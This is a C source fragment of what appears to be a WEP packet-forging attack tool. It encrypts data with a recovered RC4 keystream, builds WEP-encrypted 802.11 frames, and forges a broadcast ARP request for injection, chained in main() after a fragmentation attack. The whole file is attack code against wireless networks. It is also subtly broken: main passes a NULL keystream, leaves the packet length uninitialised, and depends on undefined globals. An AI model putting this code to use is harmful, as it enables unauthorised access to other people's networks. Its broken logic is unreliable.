#define ARP_REQ \
    "\x08\x00\x02\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" \
    "\xFF\xFF\xFF\xFF\xFF\xFF\x80\x01\xAA\xAA\x03\x00" \
    "\x00\x00\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01\xCC\xCC\xCC\xCC" \
    "\xCC\xCC\x11\x11\x11\x11\x00\x00\x00\x00\x00\x00\x22\x22\x22\x22" \
    "\x00\x00\x00\x00\x00\x00\x00\x00"

unsigned char h80211[2048];

int encrypt_data(unsigned char *dest, unsigned char* data, int length,
    uchar* prga)
{
    unsigned char cipher[2048];
    int n;

    if(dest == NULL)                return 1;
    if(data == NULL)                return 1;
    if(length < 1 || length > 2044) return 1;

    if( opt.ivs2 != NULL )
    {
        n = next_keystream(prga, 1500, opt.bssid, length);
        if(n < 0)
        {
            printf("Error getting keystream.\n");
            return 1;
        }
        if(n==1)
        {
            if(opt.first_packet == 1)
            {
                printf("Error no keystream in %s file is long enough (%d).\n",
                    IVS2_EXTENSION, length);
                return 1;
            }
            else
                n = next_keystream(prga, 1500, opt.bssid, length);
        }
    }

    /* encrypt data */
    for(n=0; n<length; n++)
    {
        cipher[n] = (data[n] ^ prga[4+n]) & 0xFF;
    }

    memcpy(dest, cipher, length);

    return 0;
}

int create_wep_packet(unsigned char* packet, int *length, uchar* prga)
{
    if(packet == NULL) return 1;

    /* write crc32 value behind data */
    if( add_crc32(packet+24, *length-24) != 0 )               return 1;

    /* encrypt data+crc32 and keep a 4byte hole */
    if( encrypt_data(packet+28, packet+24, *length-20, prga) != 0 ) return 1;

    /* write IV+IDX right in front of the encrypted data */
    if( set_IVidx(packet) != 0 )                             return 1;

    /* set WEP bit */
    packet[1] = packet[1] | 0x40;

    *length+=8;
    /* now you got yourself a shiny, brand new encrypted wep packet ;) */

    return 0;
}

int forge_arp(uchar* prga)
{
    /* use arp request */
    opt.pktlen = 60;
    memcpy( h80211, ARP_REQ, opt.pktlen );

    memcpy( opt.dmac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6 );

    if( set_tofromds(h80211) != 0 ) return 1;
    if( set_bssid(h80211)    != 0 ) return 1;
    if( set_smac(h80211)     != 0 ) return 1;
    if( set_dmac(h80211)     != 0 ) return 1;

    memcpy( h80211 + 40, opt.smac, 6 );

    if( set_dip(h80211, 56)  != 0 ) return 1;
    if( set_sip(h80211, 46)  != 0 ) return 1;

    return 0;
}

int main()
{
    uchar* prga = NULL;
    int pktlen;
    do_attack_fragmentation(prga);
    forge_arp(prga);
    create_wep_packet(h80211, &pktlen, prga);
    write_cap_packet(h80211, pktlen);
    free(prga);
    return 0;
}
